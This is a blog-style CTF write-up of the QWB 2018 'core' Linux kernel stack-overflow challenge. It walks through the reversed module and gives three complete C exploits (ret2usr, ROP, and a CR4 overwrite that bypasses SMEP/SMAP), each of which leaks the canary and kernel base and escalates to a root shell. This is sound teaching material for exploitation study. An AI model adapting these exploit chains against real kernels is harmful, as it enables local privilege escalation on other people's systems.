---
title: "Introduction of Kernel Pwn: Stack Overflow"
date: 2022-05-16 19:09:21
tags: 
layout: post
---

# 0x00 Prologue
I only have little experience with kernel pwn. During the `Intro_to_OS` course, I read a lot of kernel code of `xv6` and learned the kernel systematically. Although `xv6` is a simple system while the `Linux` kernel is much more complex, the knowledge from `xv6` learned helps a lot.

This post would not go too deep into the kernel because I am too weak to do that and I got all the solution ideas from `CTF-wiki`. You can also download the attachments at this [link][1]

# 0x01 Stack Overflow

In kernel, we also have stack overflow. But the exploitation is a little different from in user mode. There are kinds of countermeasures in the kernel, such as `kaslr`, `smep`, `smap`. Besides, we need to come back to user mode after performing privilege escaping. 

I'll start with a simple challenge and go through the exploit script to demonstrate the steps in kernel exploitation. You can get the attachment at this [link][2].

# 0x02 Analysis
For kernel challenge, we would like to start from the boot script, `start.sh`.
```sh
qemu-system-x86_64 \
-m 2G \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  

```

> Tips: Sometimes you need to change the memory limit for the qemu VM to run the qemu vm, such as `-m 2G`

> Tips: If there are multi-cores, this challenge may be related to the race condition.

This challenge only has `kaslr`, which means there is no `smap` and `smep`. During the debugging, we can modify the boot script to turn off the kaslr(`... quiet nokaslr"`).

And I would check the `init` script in the file system.

```sh
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

It's also a script, which inits the environment. As we can see, we can't read the symbol address in `/proc/kallsyms` and use `dmesg` to debug. However, all the symbols are copied in `/tmp/kallsyms`(Line 9). Also, you can comment line10-11 and change uid at line 18 to 0 while debugging.

After reviewing these scripts, we can start the reversing. There is nothing important in `init_module` and `exit_core` while in `core_ioctl` we have three functions. 

```c
__int64 __fastcall core_copy_func(__int64 a1)
{
  __int64 result; // rax
  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF

  v2[8] = __readgsqword(0x28u);
  printk(&ss1);
  if ( a1 > 63 )
  {
    printk(&unk_2A1);
    return 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(v2, &name, (unsigned __int16)a1);
  }
  return result;
}
__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  printk(&ss1);
  if ( a3 <= 0x800 && !copy_from_user(&name, a2, a3) )
    return (unsigned int)a3;
  printk(&ss2);
  return 4294967282LL;
}
```

The most important two functions are `core_copy_func` and `core_write`. We can use `write(fd,buf,0x800)` to fill the buffer `name` and use `core_copy_func` to trigger the buffer overflow because the buffer length is limited and the size is an integer so we can use "-1" to bypass the check(`<0x40`).

The solution is similar to bof in userspace.
- Leak the kernel-space address.
- Use `write` to copy the payload to the kernel space
- Use `ioctl` to call `core_copy_func` to trigger the buffer overflow
- Control RIP to perform later attacking

The leak part is simply because we can read arbitrary address by combining `ioctl(fd,OFF,off)` and `read`.
```c
#define OFFSET  0x6677889C
#define READ    0x6677889B
#define OOB     0x6677889A
int main()
{
    char buf[0x1000];
    memset(buf,0,0x1000);
    int fd = open("/proc/core",2);
    if(!fd>0)
        Panic("Open");
    // Leak the kernel address
    ioctl(fd,OFFSET,0x60);
    ioctl(fd,READ,buf);
    size_t leaked_address =  u64(buf);
    printf("%p\n",leaked_address);
    ...
```
Also, we need to use the same method to leak the canary.
```c
int main()
{
    char buf[0x1000];
    memset(buf,0,0x1000);
    int fd = open("/proc/core",2);
    if(!fd>0)
        Panic("Open");
    // Leak the data
    ioctl(fd,OFFSET,0x40);
    ioctl(fd,READ,buf);
    size_t canary           =  u64(buf);
    size_t base   =  u64(buf+0x20);
    printf("[+] Leaked Kernel Address => %p\n",base);
    printf("[+] Canary => %p\n",canary);
...
```

Let's move to the vul part and there is the asm code of `core_copy_func`
```asm
push    rbx
.text:00000000000000F7                 mov     rbx, rdi
.text:00000000000000FA                 mov     rdi, offset ss1 ; _QWORD
.text:0000000000000101                 sub     rsp, 48h
.text:0000000000000105                 mov     rax, gs:28h
.text:000000000000010E                 mov     [rsp+50h+var_10], rax
.text:0000000000000113                 xor     eax, eax
.text:0000000000000115                 call    printk
.text:000000000000011A                 cmp     rbx, 3Fh ; '?'
.text:000000000000011E                 jg      short loc_133

```
As we can see in the above asm code, the the `rdi` is compared to `0x3f`. There is a vulnerability in this check. Because it uses `jg` which means `rdi` is a `signed int`. Therefore, we can use some negative numbers to bypass it. I wrote the following simple demo to trigger the bof.
```c
    size_t poc = -1;
    ioctl(fd,OOB,poc);
```
If you debug the above payload, you would find our negative parameter bypasses the check. However, this demo can't hit the return because -1 is too large and some important data would be broken. 
```
.text:0000000000000120                 movzx   ecx, bx
.text:0000000000000123                 mov     rsi, offset name
.text:000000000000012A                 mov     rdi, rsp
.text:000000000000012D                 xor     eax, eax
.text:000000000000012F                 rep movsb
```
In above code, `bx` is moved to `ecx`. And `ecx` is used as the length to copy the data. Therefore we can make a better payload to avoid triggering the crash, such as 
```c
    size_t poc = 1;
    poc = (poc<<63) | 0x100;
    ioctl(fd,OOB,poc);
```

So our current task is to construct a payload to get the shell. There are several feasible solutions to this challenge.

# 0x03 ret2user

Because there is no `smep`, we can perform `ret2usr` which means run the code in user space so that we don't need to find specifical gadgets. 
```c
char* shellcode(){
    char * gadgets = mmap(0xdead000,0x1000,7,0x22,0,0);
    char *str = "H1\xffX\xff\xd0H\x97X\xff\xd0\x0f\x01\xf8H\xcf";
    memcpy(gadgets,str,0x100);
    return gadgets;
}
// xor rdi,rdi
// pop rax
// call rax
// xchg rax,rdi
// pop rax
// call rax
// swapgs
// iretq
```
The above shellcode would call `commit_creds(prepare_kernel_cred(0))` and return to the user space.

Btw, we need to provide the return address and other information in user mode. I used a module from `ctf-wiki` to save the state in userspace.
```c
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*] status has been saved.");
}
```
And the whole exploit script would looks like this 
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
typedef unsigned int uint;
void Panic(char *s)
{
    printf("[!] Panic:");
    puts(s);
    exit(1);
}
uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}

char* shellcode(){
    char * gadgets = mmap(0x132000,0x1000,7,0x22,0,0);
    char *str = "H1\xffX\xff\xd0H\x97X\xff\xd0\x0f\x01\xf8H\xcf";
    memcpy(gadgets,str,0x100);
    return gadgets;
}

// xor rdi,rdi
// pop rax
// call rax
// xchg rax,rdi
// pop rax
// call rax
// swapgs
// iretq

void shell(){
    system("/bin/sh");
}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*] status has been saved.");
}
#define OFFSET  0x6677889C
#define READ    0x6677889B
#define OOB     0x6677889A
int main()
{
    char buf[0x1000]={0};
    int fd = open("/proc/core",2);

    // Leak the data
    ioctl(fd,OFFSET,0x40);
    ioctl(fd,READ,buf);
    size_t canary           =  u64(buf);
    size_t base   =  u64(buf+0x20);
    printf("[+] Leaked Kernel Address => %p\n",base);
    printf("[+] Canary => %p\n",canary);

    // ret2user Space
    size_t * p = buf;
    size_t ct = 0x40/8;

    size_t prepare_creds    = base + (0xffffffff8109cce0-0xffffffff811dd6d1);
    size_t commit_cred      = base + (0xffffffff8109c8e0-0xffffffff811dd6d1);
    p[ct++] = canary;
    p[ct++] = 0xdeadbeef;
    p[ct++] = shellcode();
    p[ct++] = prepare_creds;
    p[ct++] = commit_cred;
    
    //Back to user space
    save_status();
    p[ct++] = shell;
    p[ct++] = user_cs;
    p[ct++] = user_rflags;
    p[ct++] = user_sp;
    p[ct++] = user_ss;


    // Attack
    write(fd,buf,0x100);
    size_t poc = 1;
    poc = (poc<<63) | 0x100;
    ioctl(fd,OOB,poc);  
}
```
# 0x04 rop
```c
qemu-system-x86_64 \
-m 2G \
-kernel ./bzImage \
-initrd  ./rootfs.img \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=0 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
-cpu qemu64,smep
```
Assume there is `smep` in this challenge so that we can't run the user code in the kernel, which means we have to find the gadgets in the kernel. There are several very helpful gadgets. I use `ropper` to get the gadgets from the kernel image. 

- pop [rigister]; ret;
- swapgs; popfq; ret;
- iretq; ret;

This method is almost the same as `ret2user`. The only difference is that we need to find the gadgets. I'll just show you the exploit script.

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
typedef unsigned int uint;
void Panic(char *s)
{
    printf("[!] Panic:");
    puts(s);
    exit(1);
}
uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}

char* shellcode(){
    char * gadgets = mmap(0xdead000,0x1000,7,0x22,0,0);
    char *str = "H1\xffX\xff\xd0H\x97X\xff\xd0\x0f\x01\xf8H\xcf";
    memcpy(gadgets,str,0x100);
    return gadgets;
}

// xor rdi,rdi
// pop rax
// call rax
// xchg rax,rdi
// pop rax
// call rax
// swapgs
// iretq

void shell(){
    system("/bin/sh");
}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*] status has been saved.");
}
#define OFFSET  0x6677889C
#define READ    0x6677889B
#define OOB     0x6677889A
int main()
{
    char buf[0x1000];
    memset(buf,0,0x1000);
    int fd = open("/proc/core",2);
    if(!fd>0)
        Panic("Open");
    // Leak the data
    ioctl(fd,OFFSET,0x40);
    ioctl(fd,READ,buf);
    size_t canary           =  u64(buf);
    size_t base   =  u64(buf+0x20);
    printf("[+] Leaked Kernel Address => %p\n",base);
    printf("[+] Canary => %p\n",canary);

    // ret2user Space
    size_t * p = buf;
    size_t ct = 0x40/8;

    size_t prepare_creds    = base + (0xffffffff8109cce0-0xffffffff811dd6d1);
    size_t commit_cred      = base + (0xffffffff8109c8e0-0xffffffff811dd6d1);
    size_t rdi              = base + (0xffffffff81000b2f-0xffffffff811dd6d1);
    size_t rdx              = base + (0xffffffff810a0f49-0xffffffff811dd6d1);
    //mov rdi, rax; jmp rdx;
    size_t docall           = base + (0xffffffff8106a6d2-0xffffffff811dd6d1);
    size_t swapgs_pop       = base + (0xffffffff81a012da-0xffffffff811dd6d1);
    size_t iretq            = base + (0xffffffff81050ac2-0xffffffff811dd6d1);


    p[ct++] = canary;
    p[ct++] = 0xdeadbeef;
    p[ct++] = rdi;
    p[ct++] = 0;
    p[ct++] = prepare_creds;
    p[ct++] = rdx;
    p[ct++] = commit_cred;
    p[ct++] = docall;
    
    //Back to user space
    p[ct++] = swapgs_pop;
    p[ct++] = 0;
    p[ct++] = iretq;
    save_status();
    p[ct++] = shell;
    p[ct++] = user_cs;
    p[ct++] = user_rflags;
    p[ct++] = user_sp;
    p[ct++] = user_ss;


    // Attack
    write(fd,buf,0x100);
    size_t poc = 1;
    poc = (poc<<63) | 0x100;
    ioctl(fd,OOB,poc);  
}
```

# 0x05 Bypass SMEP/SMAP
Although this challenge doesn't need to bypass SMAP, this trick also works for turning off SMAP.
The kernel uses the CR4 register to control the SMEP and SMAP. The following figure is the structure of the CR4 register. 

![CR4 From CTF-Wiki](/Figures/Kernel/CR4.jpg)


For example, if `cr4 == 0x300ef0`
```python
bool((1<<20) & 0x3006f0) -> true # SMEP on
bool((1<<21) & 0x3006f0) -> true # SMAP on
```

Therefore, we can turn off the SMEP/SMAP by using some gadget like:
```c
pop rax; // rax<-0x6f0
mov cr4, rax;
ret
```

And the exploit part would be like this:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
typedef unsigned int uint;
void Panic(char *s)
{
    printf("[!] Panic:");
    puts(s);
    exit(1);
}
uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}

char* shellcode(){
    char * gadgets = mmap(0xdead000,0x1000,7,0x22,0,0);
    char *str = "H1\xffX\xff\xd0H\x97X\xff\xd0\x0f\x01\xf8H\xcf";
    memcpy(gadgets,str,0x100);
    return gadgets;
}

// xor rdi,rdi
// pop rax
// call rax
// xchg rax,rdi
// pop rax
// call rax
// swapgs
// iretq

void shell(){
    system("/bin/sh");
}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*] status has been saved.");
}

#define OFFSET  0x6677889C
#define READ    0x6677889B
#define OOB     0x6677889A
int main()
{
    char buf[0x1000];
    memset(buf,0,0x1000);
    int fd = open("/proc/core",2);
    if(!fd>0)
        Panic("Open");
    // Leak the data
    ioctl(fd,OFFSET,0x40);
    ioctl(fd,READ,buf);
    size_t canary           =  u64(buf);
    size_t base   =  u64(buf+0x20);
    printf("[+] Leaked Kernel Address => %p\n",base);
    printf("[+] Canary => %p\n",canary);

    // ret2user Space
    size_t * p = buf;
    size_t ct = 0x40/8;

    size_t prepare_creds    = base + (0xffffffff8109cce0-0xffffffff811dd6d1);
    size_t commit_cred      = base + (0xffffffff8109c8e0-0xffffffff811dd6d1);
    size_t rdi              = base + (0xffffffff81000b2f-0xffffffff811dd6d1);

    // mov cr4, rdi; push rdx; popfq; ret;
    size_t cr4_ret  = base + (0xffffffff81075014-0xffffffff811dd6d1);

    
    p[ct++] = canary;
    p[ct++] = 0xdeadbeef;
    p[ct++] = rdi;
    p[ct++] = 0x6f0;
    p[ct++] = cr4_ret;
    p[ct++] = shellcode();
    p[ct++] = prepare_creds;
    p[ct++] = commit_cred; 

    // Back to user space
    save_status();
    p[ct++] = shell;
    p[ct++] = user_cs;
    p[ct++] = user_rflags;
    p[ct++] = user_sp;
    p[ct++] = user_ss;


    // Attack
    write(fd,buf,0x100);
    size_t poc = 1;
    poc = (poc<<63) | 0x100;
    ioctl(fd,OOB,poc);  
}
```

[1]: https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel
[2]: https://github.com/n132/attachment/tree/main/QWB_2018/core